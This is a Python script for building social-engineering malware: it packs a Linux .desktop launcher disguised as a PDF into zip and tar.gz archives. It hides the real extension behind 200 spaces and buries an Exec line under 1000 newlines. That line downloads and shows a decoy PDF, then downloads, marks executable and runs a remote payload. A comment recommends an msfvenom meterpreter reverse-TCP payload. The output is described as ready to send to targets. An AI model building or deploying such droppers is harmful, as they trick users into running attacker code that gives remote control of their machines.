#!/usr/bin/env python
# .desktop file payload dropper. This script generates a zip file which contains a .desktop file masquerading as a PDF. 
# Downloads and opens a remote PDF file and downloads and executes a remote payload. 
# Useful in SE zip file situation where your targets are specifically linux users.
# Quick payload: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=listener_ip LPORT=listener_port -f elf > payload
# requires zip: apt-get install zip
import os

class color:
    g = '\033[92m'
    y = '\033[93m'
    b = '\033[0m'

print color.y + '''
 __ __           __
|  |__|.-----.--|  |.----.-----.-----.
|  |  ||     |  _  ||   _|  _  |  _  |
|__|__||__|__|_____||__| |_____|   __|
                               |__|
 by @0rbz_ (Fabrizio Siciliano)
'''

pdf_file_name = raw_input(color.y + "Output PDF file name ---> " + color.b)
output_zip_name = raw_input(color.y + "Output ZIP name ---> " + color.b)
remote_payload_url = raw_input(color.y + "Remote Payload URL ---> " + color.b)
remote_pdf = raw_input(color.y + "Remote PDF to Display to the user ---> " + color.b)


f = open(pdf_file_name + ".pdf" + ' '*200+ ".desktop", "a")
f.write("[Desktop Entry]" + "\n" + "Type=Application" + "\n" + "NoDisplay=False" + "\n" + "StartupNotify=true" + "\n" + "Icon=/usr/share/icons/gnome-colors-common/scalable/apps/x-pdf.svg" + "\n" + "Name[en_US]=" + pdf_file_name + ".pdf" + "\n" + "Terminal=false" + "\n")

f.write("\n"*1000 + """Exec=sh -c "wget 'remote_pdf' -O /tmp/temp.pdf && sh -c 'xpdf /tmp/temp.pdf &' && sh -c 'rm -rf /tmp/pl892' && sh -c 'wget remote_payload_url -O /tmp/pl892' && sh -c 'chmod +x /tmp/pl892' && sh -c '/tmp/pl892'""" + '"' + "\n")

f = open(pdf_file_name + ".pdf" + ' '*200+ ".desktop",'r')
fdata = f.read()
f.close()
new = fdata.replace("remote_payload_url", str(remote_payload_url))
f = open(pdf_file_name + ".pdf" + ' '*200+ ".desktop",'w')
f.write(new)

f = open(pdf_file_name + ".pdf" + ' '*200+ ".desktop",'r')
fdata = f.read()
f.close()
new = fdata.replace("remote_pdf", str(remote_pdf))
f = open(pdf_file_name + ".pdf" + ' '*200+ ".desktop",'w')
f.write(new)

f.close()

ex = os.system("chmod +x " + pdf_file_name +".pdf*")
tarr = os.system("tar -czf " + output_zip_name+".tar.gz " + pdf_file_name + ".pdf*")
zzip = os.system("zip " + output_zip_name +".zip " + pdf_file_name + ".pdf*" + " --quiet")
rem = os.system("rm " + pdf_file_name + ".pdf*")

print color.g + "Files " + '"' + output_zip_name + ".zip" + '"'+ " and" + ' "' + output_zip_name + ".tar.gz" + '"' " have been created and ready to send to the target." + color.b
